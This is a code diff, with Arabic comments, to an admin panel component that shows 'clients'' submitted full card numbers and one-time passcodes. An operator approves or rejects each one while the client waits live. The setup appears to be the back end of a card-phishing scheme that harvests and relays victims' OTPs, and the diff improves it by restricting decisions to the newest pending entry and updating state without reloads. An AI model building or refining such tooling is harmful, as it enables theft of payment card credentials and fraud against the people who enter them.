@@ -10,6 +10,7 @@ type Props = {
   onBlock?: (clientId: string, blocked: boolean) => void;
   onArchive?: (clientId: string, archive: boolean) => void;
   onDelete?: (clientId: string) => void;
+  onEntryDecided?: (entryId: string, status: "approved" | "rejected") => void;
 };
 
 /** تنسيق تاريخ ثابت (توقيت قطر UTC+3) — متطابق على الخادم والعميل لتفادي أخطاء hydration. */
@@ -24,7 +25,7 @@ function formatDateTime(iso: string): string {
   return `${pad(qatar.getUTCDate())}/${pad(qatar.getUTCMonth() + 1)}/${qatar.getUTCFullYear()} ${pad(h12)}:${pad(qatar.getUTCMinutes())}:${pad(qatar.getUTCSeconds())} ${ampm}`;
 }
 
-export function ClientDetailPanel({ client, onBlock, onArchive, onDelete }: Props) {
+export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntryDecided }: Props) {
   const [confirmingDelete, setConfirmingDelete] = useState(false);
   if (!client) {
     return (
@@ -51,10 +52,34 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete }: Prop
   for (const b of client.bookings as Array<Record<string, unknown>>) {
     timeline.push({ kind: "booking", created_at: String(b.created_at ?? ""), data: b });
   }
+
+  // الإدخالات مرتّبة من الأحدث إلى الأقدم من جهة الخادم.
+  // العميل لا ينتظر قرار المدير إلا على أحدث إدخال معلّق لكل (حجز، نوع).
+  // لذلك نُقرر فقط على أحدث إدخال معلّق لكل (booking_id, type)، ونخفي أزرار
+  // القرار عن الإدخالات المعلّقة الأقدم حتى لا يقرر المدير على إدخال لم يعد
+  // العميل ينتظره — مما كان يمنع وصول قرار المدير للعميل.
+  type DecidableEntry = { type: string; payload: Record<string, unknown>; created_at: string; id: string };
+  const decidableIds = new Set<string>();
+  {
+    const seenPending = new Set<string>();
+    for (const e of client.entries as Array<DecidableEntry>) {
+      const bookingId = String(e.payload?.booking_id ?? "");
+      const entryType = e.type === "otp_request" ? "otp" : e.type === "verification" ? "otp" : e.type;
+      const status = String(e.payload?.status ?? "pending_admin");
+      const key = `${bookingId}:${entryType}`;
+      if (entryType === "payment" || entryType === "otp") {
+        if (status === "pending_admin" && !seenPending.has(key)) {
+          seenPending.add(key);
+          decidableIds.add(e.id);
+        }
+      }
+    }
+  }
+
   // إضافة الإدخالات (دفع / OTP / استفسار)
   for (const e of client.entries as Array<{ type: string; payload: Record<string, unknown>; created_at: string; id: string }>) {
-    if (e.type === "payment") timeline.push({ kind: "payment", created_at: e.created_at, data: { ...e, id: e.id } });
-    else if (e.type === "otp_request" || e.type === "verification") timeline.push({ kind: "otp", created_at: e.created_at, data: { ...e, id: e.id } });
+    if (e.type === "payment") timeline.push({ kind: "payment", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
+    else if (e.type === "otp_request" || e.type === "verification") timeline.push({ kind: "otp", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
     else if (e.type === "inquiry") timeline.push({ kind: "inquiry", created_at: e.created_at, data: { ...e } });
   }
 
@@ -169,6 +194,8 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete }: Prop
                   key={`payment-${String(item.data.id ?? i)}`}
                   entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                   latest={i === 0}
+                  decidable={item.data.decidable === true}
+                  onDecided={onEntryDecided}
                 />
               );
             }
@@ -177,6 +204,8 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete }: Prop
                 <OtpRequestCard
                   key={`otp-${String(item.data.id ?? i)}`}
                   entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
+                  decidable={item.data.decidable === true}
+                  onDecided={onEntryDecided}
                 />
               );
             }
@@ -269,9 +298,13 @@ function BookingCard({
 function PaymentCard({
   entry,
   latest,
+  decidable = true,
+  onDecided,
 }: {
   entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
   latest: boolean;
+  decidable?: boolean;
+  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
 }) {
   const p = entry.payload;
   const cardNumber = String(p.card_number ?? "");
@@ -295,12 +328,17 @@ function PaymentCard({
   async function decide(decision: "approve" | "reject") {
     setDeciding(true);
     try {
-      await fetch("/api/payments/decide", {
+      const res = await fetch("/api/payments/decide", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ entryId: entry.id, decision }),
       });
-      window.location.reload();
+      if (res.ok) {
+        // حدّث الحالة محلياً فوراً (دون إعادة تحميل)؛ البثّ يُبلغ العميل لحظياً.
+        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
+      } else {
+        setDeciding(false);
+      }
     } catch {
       setDeciding(false);
     }
@@ -359,8 +397,9 @@ function PaymentCard({
           </span>
         </div>
 
-        {/* أزرار المدير — تظهر فقط إذا كان القرار معلقاً */}
-        {status === "pending_admin" && (
+        {/* أزرار المدير — تظهر فقط على أحدث إدخال معلّق لكل حجز/نوع،
+            لأن العميل ينتظر قرار المدير فقط على هذا الإدخال. */}
+        {status === "pending_admin" && decidable && (
           <div className={styles.adminActions}>
             <button
               className={`${styles.actionBtn} ${styles.approveBtn}`}
@@ -378,6 +417,9 @@ function PaymentCard({
             </button>
           </div>
         )}
+        {status === "pending_admin" && !decidable && (
+          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
+        )}
       </div>
     </div>
   );
@@ -385,8 +427,12 @@ function PaymentCard({
 
 function OtpRequestCard({
   entry,
+  decidable = true,
+  onDecided,
 }: {
   entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
+  decidable?: boolean;
+  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
 }) {
   const p = entry.payload;
   const otp = String(p.otp ?? "----");
@@ -401,12 +447,16 @@ function OtpRequestCard({
   async function decide(decision: "approve" | "reject") {
     setDeciding(true);
     try {
-      await fetch("/api/payments/decide-otp", {
+      const res = await fetch("/api/payments/decide-otp", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ entryId: entry.id, decision }),
       });
-      window.location.reload();
+      if (res.ok) {
+        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
+      } else {
+        setDeciding(false);
+      }
     } catch {
       setDeciding(false);
     }
@@ -437,7 +487,7 @@ function OtpRequestCard({
           </span>
         </div>
 
-        {status === "pending_admin" && (
+        {status === "pending_admin" && decidable && (
           <div className={styles.adminActions}>
             <button
               className={`${styles.actionBtn} ${styles.approveBtn}`}
@@ -454,6 +504,9 @@ function OtpRequestCard({
               ✗ رفض
             </button>
           </div>
+        )}
+        {status === "pending_admin" && !decidable && (
+          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
         )}
       </div>
     </div>
